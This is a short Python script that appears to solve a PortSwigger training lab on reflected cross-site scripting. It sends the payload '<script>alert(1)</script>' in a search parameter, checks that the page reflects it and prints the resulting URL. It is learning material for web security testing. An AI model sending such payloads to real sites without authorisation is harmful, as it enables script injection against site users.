# Lab 01 — Reflected XSS into HTML context with nothing encoded
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded
#
# Vulnerability: Search functionality
# Aim:           Call alert via reflected XSS
#
# Technique:
#   The search term is reflected directly into the HTML response with zero
#   sanitisation. A bare <script> tag executes immediately.
#
#   Server returns:
#     <h1>0 search results for '<script>alert(1)</script>'</h1>
#
# Usage: python xss_lab01.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, check_reflection

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = "<script>alert(1)</script>"

if __name__ == "__main__":
    banner()
    section("LAB 01 — REFLECTED XSS: HTML CONTEXT, NOTHING ENCODED")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab01.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    print(f"  ➜  Sending payload: {PAYLOAD}\n")
    r = session.get(url, params={"search": PAYLOAD})

    check_reflection(r.text, PAYLOAD, "XSS payload")
    print()
    print("  ➜  Open this URL in a browser to confirm alert fires:")
    print(f"     {r.url}")
